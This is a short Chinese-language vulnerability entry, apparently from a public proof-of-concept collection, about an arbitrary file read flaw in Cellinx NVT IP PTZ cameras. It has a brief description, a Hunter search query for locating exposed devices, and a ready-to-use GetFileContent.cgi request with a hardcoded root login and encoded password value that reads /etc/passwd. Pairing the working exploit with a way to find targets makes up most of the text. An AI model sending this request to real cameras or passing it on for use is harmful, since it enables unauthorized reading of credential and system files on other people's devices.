# Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞

# 一、漏洞简介
Cellinx NVT IP PTZ是韩国Cellinx公司的一个摄像机设备。Cellinx NVT v1.0.6.002b版本存在安全漏洞，该漏洞源于存在本地文件泄露漏洞，攻击者可读取系统密码等敏感信息。

# 二、影响版本
+ Cellinx NVT 摄像机 

# 三、资产测绘
+ hunter`web.body="local/NVT-string.js"`
+ 特征


# 四、漏洞复现
```plain
/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hy0qp46w1tuklewg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
